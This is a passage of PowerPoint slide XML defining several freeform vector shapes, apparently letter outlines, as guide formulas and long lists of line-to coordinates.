                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="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" name="Freeform 150">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7FDEF5AC-BB7E-4B9B-8674-5815D2689A3D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4983787" y="2356000"/>
                <a:ext cx="77306" cy="130561"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 4 w 90"/>
                  <a:gd name="T1" fmla="*/ 147 h 152"/>
                  <a:gd name="T2" fmla="*/ 0 w 90"/>
                  <a:gd name="T3" fmla="*/ 140 h 152"/>
                  <a:gd name="T4" fmla="*/ 1 w 90"/>
                  <a:gd name="T5" fmla="*/ 115 h 152"/>
                  <a:gd name="T6" fmla="*/ 1 w 90"/>
                  <a:gd name="T7" fmla="*/ 111 h 152"/>
                  <a:gd name="T8" fmla="*/ 3 w 90"/>
                  <a:gd name="T9" fmla="*/ 110 h 152"/>
                  <a:gd name="T10" fmla="*/ 5 w 90"/>
                  <a:gd name="T11" fmla="*/ 112 h 152"/>
                  <a:gd name="T12" fmla="*/ 7 w 90"/>
                  <a:gd name="T13" fmla="*/ 123 h 152"/>
                  <a:gd name="T14" fmla="*/ 9 w 90"/>
                  <a:gd name="T15" fmla="*/ 128 h 152"/>
                  <a:gd name="T16" fmla="*/ 16 w 90"/>
                  <a:gd name="T17" fmla="*/ 135 h 152"/>
                  <a:gd name="T18" fmla="*/ 29 w 90"/>
                  <a:gd name="T19" fmla="*/ 141 h 152"/>
                  <a:gd name="T20" fmla="*/ 38 w 90"/>
                  <a:gd name="T21" fmla="*/ 141 h 152"/>
                  <a:gd name="T22" fmla="*/ 50 w 90"/>
                  <a:gd name="T23" fmla="*/ 140 h 152"/>
                  <a:gd name="T24" fmla="*/ 59 w 90"/>
                  <a:gd name="T25" fmla="*/ 135 h 152"/>
                  <a:gd name="T26" fmla="*/ 65 w 90"/>
                  <a:gd name="T27" fmla="*/ 127 h 152"/>
                  <a:gd name="T28" fmla="*/ 66 w 90"/>
                  <a:gd name="T29" fmla="*/ 118 h 152"/>
                  <a:gd name="T30" fmla="*/ 66 w 90"/>
                  <a:gd name="T31" fmla="*/ 111 h 152"/>
                  <a:gd name="T32" fmla="*/ 57 w 90"/>
                  <a:gd name="T33" fmla="*/ 98 h 152"/>
                  <a:gd name="T34" fmla="*/ 36 w 90"/>
                  <a:gd name="T35" fmla="*/ 83 h 152"/>
                  <a:gd name="T36" fmla="*/ 20 w 90"/>
                  <a:gd name="T37" fmla="*/ 73 h 152"/>
                  <a:gd name="T38" fmla="*/ 11 w 90"/>
                  <a:gd name="T39" fmla="*/ 62 h 152"/>
                  <a:gd name="T40" fmla="*/ 5 w 90"/>
                  <a:gd name="T41" fmla="*/ 52 h 152"/>
                  <a:gd name="T42" fmla="*/ 4 w 90"/>
                  <a:gd name="T43" fmla="*/ 40 h 152"/>
                  <a:gd name="T44" fmla="*/ 5 w 90"/>
                  <a:gd name="T45" fmla="*/ 31 h 152"/>
                  <a:gd name="T46" fmla="*/ 13 w 90"/>
                  <a:gd name="T47" fmla="*/ 17 h 152"/>
                  <a:gd name="T48" fmla="*/ 26 w 90"/>
                  <a:gd name="T49" fmla="*/ 7 h 152"/>
                  <a:gd name="T50" fmla="*/ 44 w 90"/>
                  <a:gd name="T51" fmla="*/ 2 h 152"/>
                  <a:gd name="T52" fmla="*/ 54 w 90"/>
                  <a:gd name="T53" fmla="*/ 0 h 152"/>
                  <a:gd name="T54" fmla="*/ 83 w 90"/>
                  <a:gd name="T55" fmla="*/ 4 h 152"/>
                  <a:gd name="T56" fmla="*/ 84 w 90"/>
                  <a:gd name="T57" fmla="*/ 4 h 152"/>
                  <a:gd name="T58" fmla="*/ 86 w 90"/>
                  <a:gd name="T59" fmla="*/ 7 h 152"/>
                  <a:gd name="T60" fmla="*/ 84 w 90"/>
                  <a:gd name="T61" fmla="*/ 29 h 152"/>
                  <a:gd name="T62" fmla="*/ 82 w 90"/>
                  <a:gd name="T63" fmla="*/ 36 h 152"/>
                  <a:gd name="T64" fmla="*/ 80 w 90"/>
                  <a:gd name="T65" fmla="*/ 35 h 152"/>
                  <a:gd name="T66" fmla="*/ 80 w 90"/>
                  <a:gd name="T67" fmla="*/ 32 h 152"/>
                  <a:gd name="T68" fmla="*/ 78 w 90"/>
                  <a:gd name="T69" fmla="*/ 24 h 152"/>
                  <a:gd name="T70" fmla="*/ 75 w 90"/>
                  <a:gd name="T71" fmla="*/ 20 h 152"/>
                  <a:gd name="T72" fmla="*/ 67 w 90"/>
                  <a:gd name="T73" fmla="*/ 14 h 152"/>
                  <a:gd name="T74" fmla="*/ 53 w 90"/>
                  <a:gd name="T75" fmla="*/ 11 h 152"/>
                  <a:gd name="T76" fmla="*/ 42 w 90"/>
                  <a:gd name="T77" fmla="*/ 12 h 152"/>
                  <a:gd name="T78" fmla="*/ 34 w 90"/>
                  <a:gd name="T79" fmla="*/ 16 h 152"/>
                  <a:gd name="T80" fmla="*/ 28 w 90"/>
                  <a:gd name="T81" fmla="*/ 23 h 152"/>
                  <a:gd name="T82" fmla="*/ 25 w 90"/>
                  <a:gd name="T83" fmla="*/ 31 h 152"/>
                  <a:gd name="T84" fmla="*/ 26 w 90"/>
                  <a:gd name="T85" fmla="*/ 37 h 152"/>
                  <a:gd name="T86" fmla="*/ 36 w 90"/>
                  <a:gd name="T87" fmla="*/ 49 h 152"/>
                  <a:gd name="T88" fmla="*/ 54 w 90"/>
                  <a:gd name="T89" fmla="*/ 61 h 152"/>
                  <a:gd name="T90" fmla="*/ 63 w 90"/>
                  <a:gd name="T91" fmla="*/ 66 h 152"/>
                  <a:gd name="T92" fmla="*/ 78 w 90"/>
                  <a:gd name="T93" fmla="*/ 78 h 152"/>
                  <a:gd name="T94" fmla="*/ 86 w 90"/>
                  <a:gd name="T95" fmla="*/ 89 h 152"/>
                  <a:gd name="T96" fmla="*/ 88 w 90"/>
                  <a:gd name="T97" fmla="*/ 102 h 152"/>
                  <a:gd name="T98" fmla="*/ 90 w 90"/>
                  <a:gd name="T99" fmla="*/ 108 h 152"/>
                  <a:gd name="T100" fmla="*/ 84 w 90"/>
                  <a:gd name="T101" fmla="*/ 127 h 152"/>
                  <a:gd name="T102" fmla="*/ 69 w 90"/>
                  <a:gd name="T103" fmla="*/ 144 h 152"/>
                  <a:gd name="T104" fmla="*/ 62 w 90"/>
                  <a:gd name="T105" fmla="*/ 148 h 152"/>
                  <a:gd name="T106" fmla="*/ 45 w 90"/>
                  <a:gd name="T107" fmla="*/ 152 h 152"/>
                  <a:gd name="T108" fmla="*/ 36 w 90"/>
                  <a:gd name="T109" fmla="*/ 152 h 152"/>
                  <a:gd name="T110" fmla="*/ 11 w 90"/>
                  <a:gd name="T111" fmla="*/ 149 h 152"/>
                  <a:gd name="T112" fmla="*/ 4 w 90"/>
                  <a:gd name="T113" fmla="*/ 147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90" h="152">
                    <a:moveTo>
                      <a:pt x="4" y="147"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="4" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="110"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="110"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="123"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="123"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="127"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="123"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="104"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="98"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="52"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="36"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="36"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="72" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="66"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="71"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="78"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="102"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="127"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="1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0" name="Freeform 151">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD50269F-B741-4FF8-A658-44CB6742FF0A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5072259" y="2358577"/>
                <a:ext cx="57550" cy="125407"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 18 w 67"/>
                  <a:gd name="T1" fmla="*/ 57 h 146"/>
                  <a:gd name="T2" fmla="*/ 18 w 67"/>
                  <a:gd name="T3" fmla="*/ 16 h 146"/>
                  <a:gd name="T4" fmla="*/ 16 w 67"/>
                  <a:gd name="T5" fmla="*/ 8 h 146"/>
                  <a:gd name="T6" fmla="*/ 10 w 67"/>
                  <a:gd name="T7" fmla="*/ 5 h 146"/>
                  <a:gd name="T8" fmla="*/ 4 w 67"/>
                  <a:gd name="T9" fmla="*/ 4 h 146"/>
                  <a:gd name="T10" fmla="*/ 1 w 67"/>
                  <a:gd name="T11" fmla="*/ 4 h 146"/>
                  <a:gd name="T12" fmla="*/ 0 w 67"/>
                  <a:gd name="T13" fmla="*/ 3 h 146"/>
                  <a:gd name="T14" fmla="*/ 5 w 67"/>
                  <a:gd name="T15" fmla="*/ 0 h 146"/>
                  <a:gd name="T16" fmla="*/ 31 w 67"/>
                  <a:gd name="T17" fmla="*/ 1 h 146"/>
                  <a:gd name="T18" fmla="*/ 58 w 67"/>
                  <a:gd name="T19" fmla="*/ 0 h 146"/>
                  <a:gd name="T20" fmla="*/ 60 w 67"/>
                  <a:gd name="T21" fmla="*/ 1 h 146"/>
                  <a:gd name="T22" fmla="*/ 62 w 67"/>
                  <a:gd name="T23" fmla="*/ 3 h 146"/>
                  <a:gd name="T24" fmla="*/ 59 w 67"/>
                  <a:gd name="T25" fmla="*/ 4 h 146"/>
                  <a:gd name="T26" fmla="*/ 52 w 67"/>
                  <a:gd name="T27" fmla="*/ 5 h 146"/>
                  <a:gd name="T28" fmla="*/ 49 w 67"/>
                  <a:gd name="T29" fmla="*/ 7 h 146"/>
                  <a:gd name="T30" fmla="*/ 46 w 67"/>
                  <a:gd name="T31" fmla="*/ 11 h 146"/>
                  <a:gd name="T32" fmla="*/ 45 w 67"/>
                  <a:gd name="T33" fmla="*/ 16 h 146"/>
                  <a:gd name="T34" fmla="*/ 45 w 67"/>
                  <a:gd name="T35" fmla="*/ 91 h 146"/>
                  <a:gd name="T36" fmla="*/ 45 w 67"/>
                  <a:gd name="T37" fmla="*/ 115 h 146"/>
                  <a:gd name="T38" fmla="*/ 46 w 67"/>
                  <a:gd name="T39" fmla="*/ 133 h 146"/>
                  <a:gd name="T40" fmla="*/ 47 w 67"/>
                  <a:gd name="T41" fmla="*/ 138 h 146"/>
                  <a:gd name="T42" fmla="*/ 54 w 67"/>
                  <a:gd name="T43" fmla="*/ 141 h 146"/>
                  <a:gd name="T44" fmla="*/ 63 w 67"/>
                  <a:gd name="T45" fmla="*/ 142 h 146"/>
                  <a:gd name="T46" fmla="*/ 66 w 67"/>
                  <a:gd name="T47" fmla="*/ 142 h 146"/>
                  <a:gd name="T48" fmla="*/ 67 w 67"/>
                  <a:gd name="T49" fmla="*/ 144 h 146"/>
                  <a:gd name="T50" fmla="*/ 63 w 67"/>
                  <a:gd name="T51" fmla="*/ 146 h 146"/>
                  <a:gd name="T52" fmla="*/ 31 w 67"/>
                  <a:gd name="T53" fmla="*/ 146 h 146"/>
                  <a:gd name="T54" fmla="*/ 5 w 67"/>
                  <a:gd name="T55" fmla="*/ 146 h 146"/>
                  <a:gd name="T56" fmla="*/ 2 w 67"/>
                  <a:gd name="T57" fmla="*/ 146 h 146"/>
                  <a:gd name="T58" fmla="*/ 1 w 67"/>
                  <a:gd name="T59" fmla="*/ 144 h 146"/>
                  <a:gd name="T60" fmla="*/ 4 w 67"/>
                  <a:gd name="T61" fmla="*/ 142 h 146"/>
                  <a:gd name="T62" fmla="*/ 12 w 67"/>
                  <a:gd name="T63" fmla="*/ 141 h 146"/>
                  <a:gd name="T64" fmla="*/ 13 w 67"/>
                  <a:gd name="T65" fmla="*/ 141 h 146"/>
                  <a:gd name="T66" fmla="*/ 17 w 67"/>
                  <a:gd name="T67" fmla="*/ 132 h 146"/>
                  <a:gd name="T68" fmla="*/ 18 w 67"/>
                  <a:gd name="T69" fmla="*/ 115 h 146"/>
                  <a:gd name="T70" fmla="*/ 18 w 67"/>
                  <a:gd name="T71" fmla="*/ 57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7" h="146">
                    <a:moveTo>
                      <a:pt x="18" y="57"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="18" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="5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58" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="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1" name="Freeform 152">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{50FDC0F6-B08E-4A7F-81E3-FC0515A06E23}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5130668" y="2356000"/>
                <a:ext cx="137433" cy="130561"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 144 w 160"/>
                  <a:gd name="T1" fmla="*/ 136 h 152"/>
                  <a:gd name="T2" fmla="*/ 141 w 160"/>
                  <a:gd name="T3" fmla="*/ 143 h 152"/>
                  <a:gd name="T4" fmla="*/ 129 w 160"/>
                  <a:gd name="T5" fmla="*/ 147 h 152"/>
                  <a:gd name="T6" fmla="*/ 104 w 160"/>
                  <a:gd name="T7" fmla="*/ 152 h 152"/>
                  <a:gd name="T8" fmla="*/ 92 w 160"/>
                  <a:gd name="T9" fmla="*/ 152 h 152"/>
                  <a:gd name="T10" fmla="*/ 57 w 160"/>
                  <a:gd name="T11" fmla="*/ 148 h 152"/>
                  <a:gd name="T12" fmla="*/ 35 w 160"/>
                  <a:gd name="T13" fmla="*/ 139 h 152"/>
                  <a:gd name="T14" fmla="*/ 21 w 160"/>
                  <a:gd name="T15" fmla="*/ 129 h 152"/>
                  <a:gd name="T16" fmla="*/ 11 w 160"/>
                  <a:gd name="T17" fmla="*/ 118 h 152"/>
                  <a:gd name="T18" fmla="*/ 4 w 160"/>
                  <a:gd name="T19" fmla="*/ 103 h 152"/>
                  <a:gd name="T20" fmla="*/ 0 w 160"/>
                  <a:gd name="T21" fmla="*/ 86 h 152"/>
                  <a:gd name="T22" fmla="*/ 0 w 160"/>
                  <a:gd name="T23" fmla="*/ 77 h 152"/>
                  <a:gd name="T24" fmla="*/ 3 w 160"/>
                  <a:gd name="T25" fmla="*/ 54 h 152"/>
                  <a:gd name="T26" fmla="*/ 11 w 160"/>
                  <a:gd name="T27" fmla="*/ 37 h 152"/>
                  <a:gd name="T28" fmla="*/ 21 w 160"/>
                  <a:gd name="T29" fmla="*/ 23 h 152"/>
                  <a:gd name="T30" fmla="*/ 35 w 160"/>
                  <a:gd name="T31" fmla="*/ 14 h 152"/>
                  <a:gd name="T32" fmla="*/ 49 w 160"/>
                  <a:gd name="T33" fmla="*/ 7 h 152"/>
                  <a:gd name="T34" fmla="*/ 75 w 160"/>
                  <a:gd name="T35" fmla="*/ 2 h 152"/>
                  <a:gd name="T36" fmla="*/ 89 w 160"/>
                  <a:gd name="T37" fmla="*/ 0 h 152"/>
                  <a:gd name="T38" fmla="*/ 124 w 160"/>
                  <a:gd name="T39" fmla="*/ 4 h 152"/>
                  <a:gd name="T40" fmla="*/ 140 w 160"/>
                  <a:gd name="T41" fmla="*/ 6 h 152"/>
